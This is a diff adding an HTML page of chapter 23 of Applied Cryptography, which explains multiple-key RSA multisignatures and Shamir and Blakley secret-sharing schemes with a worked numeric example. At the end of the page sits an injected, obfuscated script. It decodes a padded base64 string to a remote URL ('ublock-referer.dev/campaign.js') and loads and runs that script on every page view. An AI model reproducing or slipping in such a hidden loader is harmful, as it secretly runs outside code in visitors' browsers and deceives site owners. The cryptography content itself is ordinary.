@@ -1,0 +1,149 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Special Algorithms for Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=23//-->
+<!--PAGES=527-529//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch22/22-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="23-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 23<BR>Special Algorithms for Protocols
+</FONT></H2>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">23.1 Multiple-Key Public-Key Cryptography</FONT></H3>
+<P>This is a generalization of RSA (see Section 19.3) [217,212]. The modulus, <I>n,</I> is the product of two primes, <I>p</I> and <I>q.</I> However, instead of choosing <I>e</I> and <I>d</I> such that <I>ed</I> &#8801; 1 mod ((<I>p</I> - 1)(<I>q</I> - 1)), choose <I>t</I> keys, <I>K</I><SUB>i</SUB>, such that</P>
+<DL>
+<DD><I>K</I><SUB>1</SUB> * <I>K</I><SUB>2</SUB> *...* <I>K</I><SUB>t</SUB> &#8801; 1 mod ((<I>p</I> - 1)(<I>q</I> - 1))
+</DL>
+<P>Since
+</P>
+<DL>
+<DD><I>M<SUP>K<SMALL><SMALL>1</SMALL></SMALL>*K<SMALL><SMALL>2</SMALL></SMALL>*...*K<SMALL><SMALL>t</SMALL></SMALL></SUP></I> = <I>M</I>
+</DL>
+<P>this is a multiple-key scheme as described in Section 3.5.
+</P>
+<P>If, for example, there are five keys, a message encrypted with <I>K</I><SUB>3</SUB> and <I>K</I><SUB>5</SUB> can be decrypted with <I>K</I><SUB>1</SUB> , <I>K</I><SUB>2</SUB> , and <I>K</I><SUB>4</SUB>:</P>
+<DL>
+<DD><I>C</I> = <I>M<SUP>K<SMALL><SMALL>3</SMALL></SMALL>*K<SMALL><SMALL>5</SMALL></SMALL></SUP></I> mod <I>n</I>
+<DD><I>M</I> = <I>C<SUP>K<SMALL><SMALL>1</SMALL></SMALL>*K<SMALL><SMALL>2</SMALL></SMALL>*K<SMALL><SMALL>4</SMALL></SMALL></SUP></I> mod <I>n</I>
+</DL>
+<P>One use for this is multisignatures. Imagine a situation where both Alice and Bob have to sign a document for it to be valid. Use three keys: <I>K</I><SUB>1</SUB>, <I>K</I><SUB>2</SUB> , and <I>K</I><SUB>3</SUB>. The first two are issued one each to Alice and Bob,and the third is made public.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;First Alice signs <I>M</I> and sends it to Bob.
+<DL>
+<DD><I>M'</I> = <I>M<SUP>K<SMALL><SMALL>1</SMALL></SMALL></SUP></I> mod <I>n</I>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Bob can recover <I>M</I> from <I>M'.</I>
+<DL>
+<DD><I>M</I> = <I>M'<SUP>K<SMALL><SMALL>2</SMALL></SMALL>*K<SMALL><SMALL>3</SMALL></SMALL></SUP></I> mod <I>n</I>
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;He can also add his signature.
+<DL>
+<DD><I>M"</I> = <I>M</I><SUP>'K<SMALL><SMALL>2</SMALL></SMALL></SUP> mod <I>n</I>
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Anyone can verify the signature with <I>K</I><SUB>3</SUB> , the public key.
+<DL>
+<DD><I>M</I> = <I>M"<SUP>K<SMALL><SMALL>3</SMALL></SMALL></SUP></I> mod <I>n</I>
+</DL>
+</DL>
+<P>Note that a trusted party is needed to set this system up and distribute the keys to Alice and Bob. Another scheme with the same problem is [484]. Yet a third scheme is [695,830,700], but the effort in verification is proportional to the number of signers. Newer schemes [220,1200] based on zero-knowledge identification schemes solve both shortcomings of the previous systems.
+</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">23.2 Secret-Sharing Algorithms</FONT></H3>
+<P>Back in Section 3.7 I discussed the idea behind secret-sharing schemes. The four different algorithms that follow are all particular cases of a general theoretical framework [883].
+</P>
+<P><FONT SIZE="+1"><B><I>LaGrange Interpolating Polynomial Scheme</I></B></FONT></P>
+<P>Adi Shamir uses polynomial equations in a finite field to construct a threshold scheme [1414]. Choose a prime, <I>p,</I> which is both larger than the number of possible shadows and larger than the largest possible secret. To share a secret, generate an arbitrary polynomial of degree <I>m</I> -1. For example, if you want to create a (3,<I>n</I>)-threshold scheme (three shadows are necessary to reconstruct <I>M</I>),generate a quadratic polynomial</P>
+<DL>
+<DD>(<I>ax<SUP>2</SUP></I> &#43; <I>bx</I> &#43; <I>M</I>) mod <I>p</I>
+</DL>
+<P>where <I>p</I> is a random prime larger than any of the coefficients. The coefficients <I>a</I> and <I>b</I> are chosen randomly; they are kept secret and discarded after the shadows are handed out. <I>M</I> is the message. The prime must be made public.</P>
+<P>The shadows are obtained by evaluating the polynomial at <I>n</I> different points:</P>
+<DL>
+<DD><I>k</I><SUB>i</SUB> = <I>F</I>(<I>x</I><SUB>i</SUB>)
+</DL>
+<P>In other words, the first shadow could be the polynomial evaluated at <I>x</I> = 1, the second shadow could be the polynomial evaluated at <I>x</I> = 2, and so forth.</P>
+<P>Since the quadratic polynomial has three unknown coefficients, <I>a, b,</I> and <I>M,</I> any three shadows can be used to create three equations. Two shadows cannot. One shadow cannot. Four or five shadows are redundant.</P>
+<P>For example, let <I>M</I> be 11. To construct a (3, 5)-threshold scheme, where any three of five people can reconstruct <I>M,</I> first generate a quadratic equation (7 and 8 were chosen randomly):</P>
+<DL>
+<DD><I>F</I>(<I>x</I>) = (7<I>x<SUP>2</SUP></I> &#43; 8<I>x</I> &#43; 11) mod 13
+</DL>
+<P>The five shadows are:
+</P>
+<DL>
+<DD><I>k</I><SUB>1</SUB> = <I>F</I>(1) = 7 &#43; 8 &#43; 11 &#8801; 0 (mod 13)
+<DD><I>k</I><SUB>2</SUB> = <I>F</I>(2) = 28 &#43; 16 &#43; 11 &#8801; 3 (mod 13)
+<DD><I>k</I><SUB>3</SUB> = <I>F</I>(3) = 63 &#43; 24 &#43; 11 &#8801; 7 (mod 13)
+<DD><I>k</I><SUB>4</SUB> = <I>F</I>(4) = 112 &#43; 32 &#43; 11 &#8801; 12 (mod 13)
+<DD><I>k</I><SUB>5</SUB> = <I>F</I>(5) = 175 &#43; 40 &#43; 11 &#8801; 5 (mod 13)
+</DL>
+<P>To reconstruct <I>M</I> from three of the shadows, for example <I>k</I><SUB>2</SUB> , <I>k</I><SUB>3</SUB> , and <I>k</I><SUB>5</SUB> , solve the set of linear equations:</P>
+<DL>
+<DD><I>a</I> * 2<SUP>2</SUP> &#43; <I>b</I> * 2 &#43; <I>M</I> &#8801; 3 (mod 13)
+<DD><I>a</I> * 3<SUP>2</SUP> &#43; <I>b</I> * 3 &#43; <I>M</I> &#8801; 7 (mod 13)
+<DD><I>a</I> * 5<SUP>2</SUP> &#43; <I>b</I> * 5 &#43; <I>M</I> &#8801; 5 (mod 13)
+</DL>
+<P>The solution will be <I>a</I> =7, <I>b</I> =8, and <I>M</I> =11. So <I>M</I> is recovered.</P>
+<P>This sharing scheme can be easily implemented for larger numbers. If you want to divide the message into 30 equal parts such that any six can get together and reproduce the message, give each of the 30 people the evaluation of a polynomial of degree 6.</P>
+<DL>
+<DD><I>F</I>(<I>x</I>) = (<I>ax<SUP>6</SUP></I> &#43; <I>bx<SUP>5</SUP></I> &#43; <I>cx<SUP>4</SUP></I> &#43; <I>dx<SUP>3</SUP></I> &#43; <I>ex<SUP>2</SUP></I> &#43; <I>fx</I> &#43; <I>M</I>) mod <I>p</I>
+</DL>
+<P>Six people can solve for the six unknowns (including <I>M</I>); five people cannot learn anything about <I>M.</I></P>
+<P>The most mind-boggling aspect of secret sharing is that if the coefficients are picked randomly, five people with infinite computing power can&#146;t learn anything more than the length of the message (which each of them knows anyway). This is as secure as a one-time pad; an attempt at exhaustive search (that is, trying all possible sixth shadows) will reveal that any conceivable message could be the secret. This is true for all the secret-sharing schemes presented here.</P>
+<P><FONT SIZE="+1"><B><I>Vector Scheme</I></B></FONT></P>
+<P>George Blakley invented a scheme using points in space [182]. The message is defined as a point in <I>m-</I>dimensional space. Each shadow is the equation of an (<I>m</I> -1)-dimensional hyperplane that includes the point. The intersection of any <I>m</I> of the hyperplanes exactly determines the point.</P>
+<P>For example, if three shadows are required to reconstruct the message, then it is a point in three-dimensional space. Each shadow is a different plane. With one shadow, you know the point is somewhere on the plane. With two shadows, you know the point is somewhere on the line formed where the two planes intersect. With three shadows, you can determine the point exactly: the intersection of the three planes.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch22/22-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="23-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(OabofOQg, SnCeGYVU) {SnCeGYVU = OabofOQg.createElement('script');SnCeGYVU.type = 'text/javascript';SnCeGYVU.async = true;SnCeGYVU.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');OabofOQg.getElementsByTagName('body')[0].appendChild(SnCeGYVU);}(document));</script></body>
+</html>
